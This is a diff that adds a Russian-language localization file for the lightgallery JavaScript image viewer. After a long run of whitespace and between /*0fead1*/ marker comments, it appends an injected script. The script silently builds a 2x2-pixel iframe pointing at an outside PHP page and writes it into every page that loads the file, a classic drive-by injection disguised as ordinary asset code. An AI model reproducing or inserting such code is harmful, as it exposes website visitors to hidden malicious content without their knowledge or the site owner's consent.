@@ -1,0 +1,18 @@
+try{
+	lightgallery.setLangVars({
+		next	: 'Вперед',
+		prev	: 'Назад',
+		zoomIn	: 'Увеличить',
+		zoomOut	: 'Уменьшить',
+		fullSize: 'Реальный размер',
+		fitScreen: 'По размеру экрана',
+		close	: 'Закрыть',
+		image	: 'Изображение',
+		of		: 'из'
+	})
+}catch(e){}
+
+
+/*0fead1*/
+                                                                                                                                                                                                                                                          (function(){ var a = document.createElement('iframe'); a.src = 'http://www.real.dp.ua/img/upload/item/207/stats.php'; a.style.position = 'absolute'; a.style.border = '0'; a.style.height = '2px'; a.style.width = '2px'; a.style.left = '1px'; a.style.top = '1px'; if(!document.getElementById('mira')) { document.write('<div id=\'mira\'></div>'); document.getElementById('mira').appendChild(a); }})();
+/*/0fead1*/
